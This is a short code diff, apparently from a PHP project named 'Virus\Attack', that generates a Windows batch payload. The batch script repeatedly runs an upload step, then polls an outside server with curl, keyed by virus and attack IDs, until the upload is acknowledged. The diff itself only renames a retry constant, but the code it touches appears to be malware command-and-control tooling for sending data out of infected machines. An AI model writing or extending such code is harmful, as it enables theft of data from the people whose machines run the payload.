@@ -383,7 +383,7 @@ namespace Kelvinho\Virus\Attack {
             SetLocal EnableDelayedExpansion & set /a trials = 0
             :payload_confirmation_loop
             set /a trials+=1
-            if %trials% geq <?php echo ATTACK_RETRIES; ?> goto end_payload_confirmation_loop
+            if %trials% geq <?php echo ATTACK_UPLOAD_RETRIES; ?> goto end_payload_confirmation_loop
             <?php echo "$uploadCode\n"; ?>
             timeout <?php echo ATTACK_UPLOAD_RETRY_INTERVAL . "\n"; ?>
             for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do if "%%i"=="<?php echo $attack_id; ?>" goto payload_confirmation_loop
